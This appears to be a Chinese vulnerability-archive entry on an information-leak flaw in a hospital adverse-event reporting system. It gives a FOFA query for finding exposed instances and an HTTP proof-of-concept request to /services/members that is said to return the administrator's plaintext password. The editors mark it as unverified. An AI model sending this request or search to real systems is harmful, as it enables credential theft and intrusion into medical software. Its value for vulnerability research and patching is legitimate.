---
source: "wy876 漏洞文库"
title: "鱼尾巴医疗安全不良事件报告系统 membersbyid账号信息泄露"
product: "鱼尾巴医疗安全不良事件报告系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，members数组与权限关系待核"
prerequisites: "请求带JSESSIONID"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zfcngaidiyc37nzg"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%B1%BC%E5%B0%BE%E5%B7%B4%E7%A7%91%E6%8A%80/%E5%8C%BB%E7%96%97%E5%AE%89%E5%85%A8%28%E4%B8%8D%E8%89%AF%29%E4%BA%8B%E4%BB%B6%E6%8A%A5%E5%91%8A%E7%B3%BB%E7%BB%9Fmembersbyid%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"koma.Application\""
id: "vw-67b714f1f7c8fe80f3219549"
entity_id: "ve-67b714f1f7c8fe80f3219549"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 鱼尾巴医疗安全不良事件报告系统 membersbyid账号信息泄露

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：鱼尾巴医疗安全不良事件报告系统；membersbyid账号信息泄露
- 版本、配置及部署条件：版本未知，members数组与权限关系待核
- 认证与权限前提：请求带JSESSIONID
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Content-Type为表单而body为JSON，框架是否忽略类型需说明，与578自定义JSON-RPC类型不同
- 明文管理员密码/登录结论无返回字段证明，可能会话依赖未厘清
- 同/services/members但service=membersbyid与578members操作互补，保留差异
- 静态Content-Length、版本/补丁缺

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
鱼尾巴科技专注于医疗质控,为医院提供完整医疗质量解决方案,按照国家卫健委评审标准和中国医院质量安全管理标准,研发了医院等级评审系统、医疗安全(不良)事件报告系统、不良事件管理系统等。其中旗下医疗安全(不良)事件报告系统membersbyid存在信息泄露漏洞，通过该漏洞可获取管理员明文密码进入后台。

## 二、影响版本
+ 医疗安全(不良)事件报告系统

## 三、资产测绘
+ fofa`body="koma.Application"`
+ 特征


## 四、漏洞复现
```http
POST /services/members HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: JSESSIONID=E24C32CE389D5D5C83F3648A394B8A5E
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

{"method":"fetch","params":{"service":"membersbyid","members":["admin"]}}
```

> 请求长度说明：原资料 Content-Length 为 73；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zfcngaidiyc37nzg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
